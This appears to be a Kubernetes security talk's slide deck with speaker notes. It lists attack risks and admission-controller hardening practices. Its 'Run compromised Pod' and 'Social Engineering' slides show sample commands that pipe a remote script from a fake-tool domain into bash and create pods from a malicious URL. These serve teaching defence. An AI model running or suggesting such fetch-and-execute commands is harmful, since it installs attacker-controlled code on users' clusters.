# [fit] Inspiration

^
I'm not a security person.
Met a chap called Andy at Warpigs.
I was drunk, he was making slides in bash.
I looked at one of his talks.

Nice story Lewis.
This is over a year ago.

Who thinks that this is still an issue?

So how do we feel about this.

# Don't use kubernetes

^
This is more of a joke.
We just need to be more secure.

---

# Potential risks

^
To be secure, we need to know how.
So what are our risks.

---

# Exfiltration of sensitive data

---

# [fit] Elevate privileges
# [fit] inside Kubernetes to 
# [fit] access all workloads

---

# [fit] Potentially Gain root access 
# [fit] to the Kubernetes worker nodes

---

# [fit] Perform lateral 
# [fit] network movement 
# [fit] outside the cluster

---

# [fit] Run compromised Pod

`kubectl create -f http://Insert_Malicious_URL_here/FakeApp.yaml`

---

# Social Engineering

## Example

---

```
$ curl SRI-Tools.com/fakeapp.sh | bash
$ Kubectl create â€“f http://SRI-Tools.com/k8s/FakeApp.yaml
```

# Kubernetes best practices

---

# Least Privileged

---

# [fit] https://kubernetes.io/docs/tasks/administer-cluster/securing-a-cluster/

Authentication
Authorisation (RBAC)
Network Segmentation
PodSecurityPolicy
Encrypt Secrets
Audit Everything
Admission Controllers

---

# [fit] Admission Controller

^
Operates on the API server
Intercepts requests prior to persistence of the object to the etcd DB
but after the request has been authenticated and authorized
Can only be configured by the cluster administrator

---

# [fit] It's just an API

^
Lets break Kubernetes down.
Away from everything else, we connect to an API.
Would you have an open API?

# [fit] Layered security approach

![left fit](assets/layeredsecurity.png)

* AlwaysPullImages
* DenyEscalatingExec
* PodSecurityPolicy
* ImagePolicyWebhook
* NodeRestriction
* PodNodeSelector
* ResourceQuota

---

# [fit] AlwaysPullImages

^
Prevent reusing images.
Images can only be used by those who have the credentials to pull them.
Any pod from any user can use the image by knowing the imageâ€™s name.

---

# [fit] DenyEscalatingExec

^
Prevent privilege escalation (exec or attach) via pods running with
* privileged: true
* Host IPC namespace
* Host PID namespace
If your cluster supports containers that run with escalated privileges, restrict the ability of end-users to exec commands in those containers, using this admission controller.

---

# [fit] PodSecurityPolicy

^
Privileged containers
Root namespaces
Volume types
Read only root file system
UID, GID of the container
SELinux/AppArmor context
seccomp profile
By Default there is no  Selinux/AppArmor/seccomp profile

# [fit] NodeRestriction

# ResourceQuota

| Name | Description |
| --- | --- |

| memory | Total requested memory usage |
| pods | Total number of active pods where phase is pending or active.|
| services | Total number of services |
| replicationcontrollers | Total number of replication controllers |
| resourcequotas | Total number of resource quotas |
| secrets | Total number of secrets |
